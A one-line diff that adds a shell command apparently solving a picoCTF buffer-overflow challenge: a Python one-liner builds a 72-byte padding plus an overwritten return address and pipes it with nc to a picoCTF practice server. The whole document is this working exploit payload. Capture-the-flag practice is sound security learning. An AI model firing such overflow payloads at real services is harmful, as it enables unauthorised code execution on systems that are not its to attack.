@@ -1,0 +1,1 @@
+python3 -c 'import struct; print("A"*72 + struct.pack("<I", 0x000000000040123b).decode("utf8"))'  | nc saturn.picoctf.net 65293
